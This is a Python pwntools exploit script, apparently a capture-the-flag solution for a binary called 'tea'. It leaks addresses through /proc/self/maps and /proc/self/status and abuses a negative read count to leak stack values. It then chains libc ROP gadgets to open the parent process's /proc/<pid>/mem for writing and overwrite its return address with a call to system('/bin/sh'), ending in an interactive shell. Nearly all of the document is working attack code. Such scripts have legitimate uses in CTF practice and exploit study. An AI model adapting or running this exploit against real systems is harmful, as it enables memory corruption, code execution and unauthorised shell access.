#!/usr/bin/python
from pwn import *

def parsing_maps():
	r.recvuntil('bytes\n')
	data = r.recvuntil('[vsyscall]')
	data = data.split('\n')
	parent_code_base = int(data[0].split('-')[0], 16)
	for a in data:
		if 'heap' in a and 'rw-p' in a:
			heap_base = int(a.split('-')[0], 16)

		if 'libc' in a and 'r-xp' in a:
			libc_base = int(a.split('-')[0], 16)
			child_base = libc_base - 0x100000000000
			break

	r.sendlineafter('quit? (y/n)\n', 'n')

	return parent_code_base, child_base, heap_base, libc_base

def parsing_ppid():
	r.recvuntil('bytes\n')
	data = r.recvuntil('TracerPid:')
	data = data.split('\n')
	for a in data:
		if 'PPid' in a:
			break
	r.sendlineafter('quit? (y/n)\n', 'n')

	return int(a.split(':')[1], 10)

def readfile(filename, offset, count, data, flag='else'):
	r.sendlineafter('(r)ead or (w)rite access?\n', 'r')
	r.sendlineafter('filename?\n', filename)
	r.sendlineafter('lseek?\n', str(offset))
	r.sendlineafter('count?\n', (count))
	
	if flag == 'maps':
		return parsing_maps()
	elif flag == 'ppid':
		return parsing_ppid()
	elif flag == 'input':
		r.sendline(data)
		return
	elif flag == 'stack_leak':
		r.sendline(data)
		r.recvregex('read \d+ bytes\n')
		leak = u64(r.recv(6).ljust(8,'\x00'))
		r.sendlineafter('quit? (y/n)\n', 'n')
		return leak
	else:
		return

r = process('./tea')
context.log_level = 'debug'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#gdb.attach(r)


########   leaking   ########
parent_code_base, child_base, heap_base, libc_base = readfile('/proc/self/maps', 0, str(0x1000), 0, 'maps')

success('leaking.. memory')
log.info('PIE base = '+hex(parent_code_base))
log.info('heap_base = '+hex(heap_base))
log.info('child_base = '+hex(child_base))
log.info('libc_base = '+hex(libc_base))
system_addr = libc_base + libc.symbols['system']
log.info('system_addr = '+hex(system_addr))
binsh_addr = libc_base + next(libc.search('/bin/sh'))
log.info('/bin/sh_addr = '+hex(binsh_addr))


ppid = readfile('/proc/self/status', 0, str(0x1000), 0,'ppid')

success('leaking.. parent pid')
log.info('parent pid = '+str(ppid))


## tea gadget ##
leave_ret = parent_code_base + 0x0000000000001dbc # leave ; ret
exit_got = parent_code_base + 0x00202FE0 # exit@got
malloc_got = parent_code_base + 0x000202FB0 # malloc@got

## libc gadget ##
pop_rdi = libc_base + 0x0000000000021102 # pop rdi ; ret
pop_rsi = libc_base + 0x00000000000202e8 # pop rsi ; ret
pop_rdx = libc_base + 0x0000000000001b92 # pop rdx ; ret
pop_rax = libc_base + 0x0000000000033544 # pop rax ; ret
syscall = libc_base + 0x00000000000bc375 # syscall ; ret

open_addr = libc_base + libc.symbols['open']
lseek_addr = libc_base + libc.symbols['lseek']
close_addr = libc_base + libc.symbols['close']
read_addr = libc_base + libc.symbols['read']
write_addr = libc_base + libc.symbols['write']
exit_addr = libc_base + libc.symbols['exit']
libc_environ = libc_base + libc.symbols['environ']

parent_waitpid_ret = readfile('/proc/self/fd/0', 0, str(-0x80000000), 'a'*0x30+p64(3)+p64(libc_environ), 'stack_leak')
parent_waitpid_ret -= 240

mmaped_addr = readfile('/proc/self/fd/0', 0, str(-0x80000000), 'a'*0x30+p64(3)+p64(parent_waitpid_ret-0x10), 'stack_leak')
random_num = readfile('/proc/self/fd/0', 0, str(-0x80000000), 'a'*0x30+p64(3)+p64(parent_waitpid_ret-0x30), 'stack_leak')
child_read_ret = mmaped_addr + random_num - 104

parent_waitpid_ret -= 80

success('leak stack...')
log.info('parent_waitpid_ret = '+hex(parent_waitpid_ret))
log.info('mmaped_addr = '+hex(mmaped_addr))
log.info('random_num = '+hex(random_num))
log.info('child_read_ret = '+hex(child_read_ret))



# make "/proc/ppid/mem"
payload = p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(child_base + 0x1000) # /proc/ppid/mem
payload += p64(pop_rdx)
payload += p64(0x1000)
payload += p64(read_addr)

# make ROP chain 2
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(child_base + 0x2000) # ROP chain 2
payload += p64(pop_rdx)
payload += p64(0x1000)
payload += p64(read_addr)

# close fd 
payload += p64(pop_rdi)
payload += p64(0x8000000000000002)
payload += p64(close_addr)

# open /proc/ppid/mem w
payload += p64(pop_rdi)
payload += p64(child_base + 0x1000)
payload += p64(pop_rsi)
payload += p64(2) # w permission
payload += p64(open_addr)

# lseek(2, parent_waitpid_ret, 0)
payload += p64(pop_rdi)
payload += p64(2)
payload += p64(pop_rsi)
payload += p64(parent_waitpid_ret)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(lseek_addr)

# write
payload += p64(pop_rdi)
payload += p64(2)
payload += p64(pop_rsi)
payload += p64(child_base + 0x2000)
payload += p64(pop_rdx)
payload += p64(0x1000)
payload += p64(write_addr)

# exit
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(exit_addr)


### execute ROP chain and parent_waitpid_ret overwrite ###
readfile('/proc/self/fd/0', 0, str(-0x80000000).ljust(0x28,'\x00')+p64(0)+p64(0)+p64(child_read_ret), payload, 'input')
	
r.sendline('/proc/{}/mem'.format(ppid) + '\x00')
r.sendline(p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)) ## parent_waitpid_ret overwrite

r.interactive()